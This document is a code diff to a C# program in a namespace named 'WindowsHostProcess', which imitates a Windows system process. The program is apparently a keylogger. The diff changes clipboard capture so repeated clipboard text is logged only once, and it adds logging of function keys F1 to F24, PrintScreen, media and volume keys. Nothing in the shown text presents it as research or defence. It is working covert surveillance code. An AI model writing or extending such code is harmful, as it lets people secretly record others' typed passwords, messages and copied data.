@@ -16,7 +16,8 @@ namespace WindowsHostProcess
         public static string preWin = "";
         public static string newWin = "";
         public static int fstWin = 0;
-        public static string OldClipText = string.Empty;
+        public static string clipboardText = "";
+        public static string oldClipboardText = "";
 
         [STAThread]
         public static void Main(string[] args)
@@ -46,10 +47,17 @@ namespace WindowsHostProcess
 
         private static string GetClipboardData()
         {
+
             if (Clipboard.ContainsText(TextDataFormat.Text))
             {
-                string clipboardText = "   [CLIPBOARD]    " + Clipboard.GetText(TextDataFormat.Text) + "   [CLIPBOARD]   " + Environment.NewLine;
-                return clipboardText.ToString();
+                clipboardText = "   [CLIPBOARD]   " + Clipboard.GetText(TextDataFormat.Text) 
+                              + "   [CLIPBOARD]   " + Environment.NewLine;
+
+                if (clipboardText != oldClipboardText)
+                {
+                    oldClipboardText = clipboardText;
+                    return clipboardText.ToString();
+                }                
             }
             return null;
         }
@@ -313,6 +321,146 @@ namespace WindowsHostProcess
                         sw.Write("{BACK}");
                         break;
 
+                    case Keys.F1:
+                        sw.Write("{F1}");
+                        break;
+
+                    case Keys.F2:
+                        sw.Write("{F2}");
+                        break;
+
+                    case Keys.F3:
+                        sw.Write("{F3}");
+                        break;
+
+                    case Keys.F4:
+                        sw.Write("{F4}");
+                        break;
+
+                    case Keys.F5:
+                        sw.Write("{F5}");
+                        break;
+
+                    case Keys.F6:
+                        sw.Write("{F6}");
+                        break;
+
+                    case Keys.F7:
+                        sw.Write("{F7}");
+                        break;
+
+                    case Keys.F8:
+                        sw.Write("{F8}");
+                        break;
+
+                    case Keys.F9:
+                        sw.Write("{F9}");
+                        break;
+
+                    case Keys.F10:
+                        sw.Write("{F10}");
+                        break;
+
+                    case Keys.F11:
+                        sw.Write("{F11}");
+                        break;
+
+                    case Keys.F12:
+                        sw.Write("{F12}");
+                        break;
+
+                    case Keys.F13:
+                        sw.Write("{F13}");
+                        break;
+
+                    case Keys.F14:
+                        sw.Write("{F14}");
+                        break;
+
+                    case Keys.F15:
+                        sw.Write("{F15}");
+                        break;
+
+                    case Keys.F16:
+                        sw.Write("{F16}");
+                        break;
+
+                    case Keys.F17:
+                        sw.Write("{F17}");
+                        break;
+
+                    case Keys.F18:
+                        sw.Write("{F18}");
+                        break;
+
+                    case Keys.F19:
+                        sw.Write("{F19}");
+                        break;
+
+                    case Keys.F20:
+                        sw.Write("{F20}");
+                        break;
+
+                    case Keys.F21:
+                        sw.Write("{F21}");
+                        break;
+
+                    case Keys.F22:
+                        sw.Write("{F22}");
+                        break;
+
+                    case Keys.F23:
+                        sw.Write("{F23}");
+                        break;
+
+                    case Keys.F24:
+                        sw.Write("{F24}");
+                        break;
+
+                    case Keys.PrintScreen:
+                        sw.Write("{PrintScreen}");
+                        break;
+
+                    case Keys.Scroll:
+                        sw.Write("{ScrollLock}");
+                        break;
+
+                    case Keys.Pause:
+                        sw.Write("{Pause/Break}");
+                        break;
+
+                    case Keys.VolumeDown:
+                        sw.Write("{Vol↓}");
+                        break;
+
+                    case Keys.VolumeUp:
+                        sw.Write("{Vol↑}");
+                        break;
+
+                    case Keys.VolumeMute:
+                        sw.Write("{VolX}");
+                        break;
+
+                    case Keys.MediaPreviousTrack:
+                        sw.Write("{PreviousTrack}");
+                        break;
+
+                    case Keys.MediaNextTrack:
+                        sw.Write("{NextTrack}");
+                        break;
+
+                    case Keys.MediaPlayPause:
+                        sw.Write("{Play/Pause}");
+                        break;
+
+                    case Keys.MediaStop:
+                        sw.Write("{MediaStop}");
+                        break;
+
+                    case Keys.Apps:
+                        sw.Write("{Apps}");
+                        break;
+                                            
                     default:
                         if (Control.ModifierKeys != Keys.Shift)
                             sw.Write(((char)(Keys)vkCode).ToString().ToLower());//Make these lowercase
